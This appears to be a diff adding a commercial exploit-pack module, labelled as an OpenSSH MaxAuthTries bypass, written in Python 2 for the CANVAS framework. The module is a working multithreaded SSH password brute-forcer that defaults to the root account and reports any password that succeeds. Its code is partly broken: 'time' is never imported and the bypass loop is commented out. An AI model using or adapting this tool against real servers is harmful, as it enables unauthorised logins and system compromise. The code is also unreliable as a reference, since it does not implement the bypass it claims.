@@ -1,0 +1,160 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2015
+#
+
+import os
+import getopt
+import sys
+import socket
+import struct
+import string
+
+sys.path.append('.')
+sys.path.append('3rdparty/D2SEC/exploits/d2sec_sshmaxauthtries_bypass/')
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+import threading
+
+NAME = 'd2sec_sshmaxauthtries_bypass'
+DESCRIPTION='OpenSSH keyboard-interactive authentication brute force Vulnerability (MaxAuthTries bypass)'
+VERSION='0.1'
+
+DOCUMENTATION = {}
+DOCUMENTATION['VENDOR'] = ""
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION['Date public'] = ""
+DOCUMENTATION['References'] = "https://kingcope.wordpress.com/2015/07/16/openssh-keyboard-interactive-authentication-brute-force-vulnerability-maxauthtries-bypass/"
+DOCUMENTATION['Versions Affected'] = ""
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = ""
+DOCUMENTATION["CVE Url"] = ""
+DOCUMENTATION["Notes"] = ""
+
+PROPERTY={}
+PROPERTY['TYPE']='Exploit'
+PROPERTY['SITE']='Remote'
+PROPERTY['ARCH'] = [ ["Linux"], ["Windows"], ["Solaris"], ["AIX"], ["FreeBSD"], ["MacOSX"], ["HP-UX"] ]
+
+
+
+class theexploit(tcpexploit):
+
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.work_done = False
+    self.port = 22
+    self.user = "root"
+    self.password = "root"
+    self.filename = None
+    self.mylock = threading.RLock()
+    self.found_password = None
+    self.threadcount = 5
+
+  def start_workers(self):
+    self.log("[D2] Spawning %d threads ..." % self.threadcount)
+    for i in range(0, self.threadcount):
+      thread = threading.Thread(target=self.bruteforce_password_user)
+      thread.start()
+
+  def wait4workers(self):
+    while (self.work_done != True):
+      time.sleep(1)
+
+  def get_next_value(self):
+    while 1:
+      try:
+        value = self.fd.readline()
+        if value == '':
+          self.no_more_value = True
+          break
+        value = value.strip()
+      except IOError:
+        break
+      yield value 
+    return
+
+  def bruteforce_password_user(self):
+    password = 'A'
+    no_more_password = False
+    max_tries_per_connect = 5
+
+    try:
+      import d2pxssh
+    except Exception, e:
+      self.log("[D2] Exploit d2sec_sshmaxauthtries_bypass: module python 'pexpect' not installed !")
+      self.setInfo('[D2] %s attacking %s:%d - failed' % (NAME, self.host, self.port))
+      return 0
+
+    while password != None or self.work_done != True:
+      if self.work_done == True: 
+        break
+      #for i in xrange(0, max_tries_per_connect):  
+      self.mylock.acquire()
+      try:
+        password = self.passwords.next()
+      except StopIteration:
+        no_more_password = True
+      self.mylock.release()
+      if no_more_password:
+        self.work_done = True
+        break
+      try:
+        child = d2pxssh.pxssh()
+        self.log("[+] Trying %s:%s" % (self.user, password))
+        child.login(self.host, self.user, password)
+        self.log("[D2] Password '%s' success" % password)
+        child.logout()
+        self.found_password = password
+        self.work_done = True
+      except d2pxssh.ExceptionPxssh, e:
+        self.log("[-] Password '%s' failed" % password)
+    return
+
+  def getargs(self):
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get('port', self.port))
+    self.user = self.argsDict.get('user', self.user)
+    self.filename = self.argsDict.get('filename', self.filename)
+    if self.filename != None:
+      if not os.path.isfile(self.filename):
+        self.log('[D2] %s not found' % self.filename)
+        return 1
+    self.threadcount = int(self.argsDict.get('threadcount', self.threadcount))
+    return 0
+
+  def run(self):
+    self.no_more_password = False
+    if self.getargs():
+      return 0
+    self.log('[D2] %s running' % NAME)
+    self.setInfo('[D2] %s running' % NAME)
+    try:
+      self.fd = file(self.filename, 'rb')
+    except Exception, e:
+      self.log("[D2] %s" % e)
+      self.setInfo('[D2] %s attacking %s:%d - failed' % (NAME, self.host, self.port))
+      return 0
+    self.log('[D2] User %s with password file %s' % (self.user, self.filename)) 
+    self.passwords = self.get_next_value()
+    self.start_workers()
+    self.wait4workers()
+    time.sleep(5)
+    if self.found_password != None:
+      self.log('Found working password: %s' % self.found_password)
+    self.setInfo('[D2] %s attacking %s:%d - done' % (NAME, self.host, self.port))
+    return 1
+
+  def usage(self):
+    print 'Usage: %s -t host -p port -O user:<user> -O filename:<file pathname> -O threadcount:5\n' % sys.argv[0]
+    sys.exit(0)
+
+if __name__=='__main__':
+  print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
